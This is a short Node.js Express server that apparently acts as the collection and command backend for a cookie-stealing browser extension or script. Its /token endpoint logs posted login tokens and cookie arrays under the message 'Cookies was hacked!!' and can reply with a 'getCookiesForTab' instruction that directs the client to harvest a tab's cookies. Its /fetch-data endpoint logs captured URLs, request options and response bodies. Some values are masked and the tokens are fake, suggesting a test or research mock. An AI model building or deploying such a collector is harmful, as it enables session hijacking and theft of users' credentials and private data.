const express = require("express");
const app = express();
const PORT = 5555;

app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ extended: true, limit: "50mb" }));
function logTokenRequest(req) {
  let recivedData = req.body;
  if (req.body?.loginInfo?.token instanceof Array) {
    // Only for safety
    recivedData = req.body.loginInfo.token.map((a) => ({
      ...a,
      value: "#####",
    }));
    console.log("Cookies was hacked!!", JSON.stringify(recivedData));
  } else if (req.body?.loginInfo?.token) {
    console.log("Token is ", req.body.loginInfo.token);
  } else {
    console.log("No token found");
  }
}

app.post("/fetch-data", (req, res) => {
  const { response, options, url, timestamp } = req.body;
  console.log("=== FETCH DATA RECEIVED ===");
  console.log("URL:", url);
  console.log("options:", JSON.stringify(options, null, 2));
  console.log("Timestamp:", timestamp);
  console.log("Response length:", response ? response.length : 0);
  console.log(
    "Response preview:",
    response ? response.substring(0, 500) + "..." : "No response"
  );
  res.json({
    success: true,
    message: "Fetch data received and logged",
    receivedAt: new Date().toISOString(),
  });
});

app.post("/token", (req, res) => {
  const { flag = false } = req.body;
  logTokenRequest(req);
  let result = {
    tokenReciveFunction: "onRefreshCountHandler",
    expireTime: Date.now() + 7 * 24 * 60 * 60 * 1000,
    token: `FAKE_TOKEN_${Date.now()}`,
  };
  if (flag) {
    result = {
      tokenReciveFunction: "onMessageHandler",
      token: { type: "getCookiesForTab" },
    };
  }
  res.json(result);
});

app.listen(PORT, () => {
  console.log(`🚀 Server is running on http://localhost:${PORT}`);
});
